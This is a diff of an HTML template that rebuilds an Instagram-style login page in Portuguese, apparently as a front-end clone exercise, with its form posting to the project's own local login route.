@@ -1,22 +1,66 @@
-<section>
 
-    <div>
-        <h1>Instagram</h1>
-        <form action="/logar" method="post">
-            <input type="email" name="email" id="email" placeholder="Telefone, nome de usuário ou email">
-            <input type="password" name="senha" id="senha" placeholder="Senha">
-            <div>
-                <a href="/esqueceuASenha">esqueceu a senha?</a>
-            </div>
-            <button type="submit">Entrar</button>
-        </form>
+<section class="section">
+    <div class="pc">
         <div>
-            <p>náo tem uma conta? <a href="cadastrar">Cadastre-se</a></p>
+            <img src="https://via.placeholder.com/300" alt="imagem celular">
         </div>
-        <p>Ao continuar, você concorda com os termos de uso e a política de privacidade do instagram.</p>
-        <div>from meta</div>
+        <div>
+            <div class="border">
+                <h1 class="tituloInstagram">Instagram</h1>
+                <form action="/tryLogin" class="formulario" method="post">
+                    <input class="inpt" type="text" placeholder="  Telefone, nome de usuário ou email" required name="email">
+                    <input class="inpt" type="password" placeholder="  Senha" required name="senha">
+                    <button type="submit">Entrar</button>
+                </form>
+                <div class="divOU">
+                    <div></div>
+                    <span>OU</span>
+                    <div></div>
+                </div>
+                <div class="divFuncoes">
+                    <a href="#" class="faceboock">Entrar com o Facebook</a>
+                    
+                    <a href="#" class="esqueceuASenha">Esqueceu a senha?</a>
+                </div>
+            </div>
+            <div class="semConta">
+                <h6>não tem uma conta? <a href="#">Cadastre-se</a></h6>
+            </div>
+            <div class="divAplicativos">
+                <h4>Obtenha o aplicativo.</h4>
+                <div class="container">
+                    <div class="divItemAplicativos">
+                        <p>Disponível no</p>
+                        <h4>Google Play</h4>
+                    </div>
+                    <div class="divItemAplicativos">
+                        <p>Baixe da</p>
+                        <h4>Microsoft</h4>
+                    </div>
+                </div>
+            </div>
+        </div>
     </div>
-
-
-
 </section>
+
+<div class="divLinks">
+    <a href="#">Meta</a>
+    <a href="#">Sobre</a>
+    <a href="#">Blog</a>
+    <a href="#">Carreiras</a>
+    <a href="#">Ajuda</a>
+    <a href="#">API</a>
+    <a href="#">Privacidade</a>
+    <a href="#">Termos</a>
+    <a href="#">Localização</a>
+    <a href="#">Instagram lite</a>
+    <a href="#">Threads</a>
+    <a href="#">Meta Verified</a>
+</div>
+
+<footer class="footer">
+    <p>Português (Brasil) 2023 Instagram from Meta</p>
+</footer>
+
+</body>
+
